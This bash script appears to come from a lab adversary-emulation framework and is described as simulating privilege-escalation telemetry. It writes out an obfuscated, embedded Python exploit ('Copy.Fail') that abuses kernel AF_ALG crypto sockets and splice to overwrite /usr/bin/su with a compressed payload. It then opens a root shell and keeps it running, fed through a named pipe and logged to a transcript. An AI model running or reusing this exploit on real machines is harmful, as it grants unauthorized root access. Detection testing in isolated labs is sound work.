#!/usr/bin/env bash
#
# payloads/priv_esc/root_copyfail/commands.sh
#
# Runs an embedded Copy.Fail proof-of-concept to simulate local privilege
# escalation telemetry in an isolated Aegis lab/VM target.

set -Eeuo pipefail

if [[ "${ROOT_COPYFAIL_DEBUG:-false}" == "true" ]]; then
    set -x
fi

if [[ -z "${FRAMEWORK_ROOT:-}" ]]; then
    echo "[x] FRAMEWORK_ROOT must be set" >&2
    exit 1
fi

source "$FRAMEWORK_ROOT/lib/log_utils.sh"
source "$FRAMEWORK_ROOT/lib/template_utils.sh"
source "$FRAMEWORK_ROOT/lib/metadata_utils.sh"

shell_quote() {
    printf "%q" "$1"
}

is_safe_copyfail_base() {
    local base="$1"

    case "${base%/}/aegis_copyfail_${RUN_ID:-manual}" in
        /tmp/aegis_copyfail_* | /var/tmp/aegis_copyfail_* | /dev/shm/aegis_copyfail_* | \
        /tmp/.cache/aegis_copyfail_* | /tmp/.config/aegis_copyfail_* | \
        /var/tmp/.system/aegis_copyfail_* | /dev/shm/.runtime/aegis_copyfail_*)
            return 0
            ;;
        *)
            return 1
            ;;
    esac
}

pick_writable_copyfail_base() {
    local candidate
    local probe

    for _ in 1 2 3 4 5 6 7 8 9 10; do
        candidate="$(pick_staging_dir)"
        is_safe_copyfail_base "$candidate" || continue
        probe="${candidate%/}/aegis_copyfail_probe_${RUN_ID:-manual}_$$"

        if mkdir -p "$probe" 2>/dev/null; then
            rmdir "$probe" >/dev/null 2>&1 || true
            printf '%s\n' "${candidate%/}"
            return 0
        fi
    done

    for candidate in /tmp /var/tmp /dev/shm; do
        probe="${candidate%/}/aegis_copyfail_probe_${RUN_ID:-manual}_$$"
        if mkdir -p "$probe" 2>/dev/null; then
            rmdir "$probe" >/dev/null 2>&1 || true
            printf '%s\n' "${candidate%/}"
            return 0
        fi
    done

    fail "Unable to find writable Copy.Fail staging base"
}

log "root_copyfail starting"
log "Execution user: $(whoami)"
log "Execution id: $(id)"

COPYFAIL_BASE_DIR="${COPYFAIL_BASE_DIR:-}"
if [[ -z "$COPYFAIL_BASE_DIR" ]]; then
    COPYFAIL_BASE_DIR="$(pick_writable_copyfail_base)"
fi
COPYFAIL_WORKDIR="${COPYFAIL_WORKDIR:-${COPYFAIL_BASE_DIR}/aegis_copyfail_${RUN_ID:-manual}}"
COPYFAIL_REMOVE_EXISTING_WORKDIR="${COPYFAIL_REMOVE_EXISTING_WORKDIR:-true}"
COPYFAIL_SESSION_READY_TIMEOUT="${COPYFAIL_SESSION_READY_TIMEOUT:-20}"
COPYFAIL_SESSION_FIFO="${COPYFAIL_SESSION_FIFO:-${COPYFAIL_WORKDIR}/root_shell.in}"
COPYFAIL_SESSION_TRANSCRIPT="${COPYFAIL_SESSION_TRANSCRIPT:-${COPYFAIL_WORKDIR}/root_shell.log}"
COPYFAIL_SESSION_PID_FILE="${COPYFAIL_SESSION_PID_FILE:-${COPYFAIL_WORKDIR}/root_shell.pid}"
COPYFAIL_EXPLOIT_PATH="${COPYFAIL_EXPLOIT_PATH:-${COPYFAIL_WORKDIR}/copyfail_exp.py}"
COPYFAIL_READY_MARKER="__AEGIS_COPYFAIL_ROOT_SESSION_READY_${RUN_ID:-manual}__"

case "$COPYFAIL_WORKDIR" in
    /tmp/aegis_copyfail_* | /var/tmp/aegis_copyfail_* | /dev/shm/aegis_copyfail_* | \
    /tmp/.cache/aegis_copyfail_* | /tmp/.config/aegis_copyfail_* | \
    /var/tmp/.system/aegis_copyfail_* | /dev/shm/.runtime/aegis_copyfail_*)
        ;;
    *)
        fail "Refusing unsafe COPYFAIL_WORKDIR: $COPYFAIL_WORKDIR"
        ;;
esac

if [[ "$COPYFAIL_REMOVE_EXISTING_WORKDIR" == "true" && -e "$COPYFAIL_WORKDIR" ]]; then
    log "Removing existing Copy.Fail workdir: $COPYFAIL_WORKDIR"
    rm -rf -- "$COPYFAIL_WORKDIR"
fi

mkdir -p "$COPYFAIL_WORKDIR"

record_metadata "copyfail_workdir=$COPYFAIL_WORKDIR"
record_metadata "copyfail_exploit_path=$COPYFAIL_EXPLOIT_PATH"
record_metadata "shell_session_type=fifo"
record_metadata "shell_session_user=root"
record_metadata "shell_session_input=$COPYFAIL_SESSION_FIFO"
record_metadata "shell_session_transcript=$COPYFAIL_SESSION_TRANSCRIPT"
record_metadata "shell_session_pid_file=$COPYFAIL_SESSION_PID_FILE"
record_metadata "shell_session_workdir=$COPYFAIL_WORKDIR"

log "Writing embedded Copy.Fail proof-of-concept"

cat > "$COPYFAIL_EXPLOIT_PATH" <<'PYEOF'
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
PYEOF

chmod 700 "$COPYFAIL_EXPLOIT_PATH"

log "Starting Copy.Fail-backed root shell session"
rm -f -- "$COPYFAIL_SESSION_FIFO"
mkfifo "$COPYFAIL_SESSION_FIFO"
: > "$COPYFAIL_SESSION_TRANSCRIPT"

setsid bash -c '
    fifo="$1"
    transcript="$2"
    exploit="$3"
    tail -f "$fifo" | python3 "$exploit" >> "$transcript" 2>&1
' bash "$COPYFAIL_SESSION_FIFO" "$COPYFAIL_SESSION_TRANSCRIPT" "$COPYFAIL_EXPLOIT_PATH" \
    </dev/null >/dev/null 2>&1 &

COPYFAIL_SESSION_PID="$!"
printf '%s\n' "$COPYFAIL_SESSION_PID" > "$COPYFAIL_SESSION_PID_FILE"

record_metadata "shell_session_pid=$COPYFAIL_SESSION_PID"

sleep 2

log "Priming root shell session"
{
    printf 'id\n'
    printf 'echo %s\n' "$(shell_quote "$COPYFAIL_READY_MARKER")"
} > "$COPYFAIL_SESSION_FIFO"

READY_DEADLINE=$((SECONDS + COPYFAIL_SESSION_READY_TIMEOUT))

while (( SECONDS < READY_DEADLINE )); do
    if grep -q "$COPYFAIL_READY_MARKER" "$COPYFAIL_SESSION_TRANSCRIPT" 2>/dev/null; then
        record_metadata "shell_session_active=true"
        break
    fi
    sleep 1
done

if ! grep -q "$COPYFAIL_READY_MARKER" "$COPYFAIL_SESSION_TRANSCRIPT" 2>/dev/null; then
    record_metadata "shell_session_active=false"
    fail "Copy.Fail root shell session did not become ready before timeout"
fi

record_metadata "copyfail_completed=true"

log "root_copyfail complete"
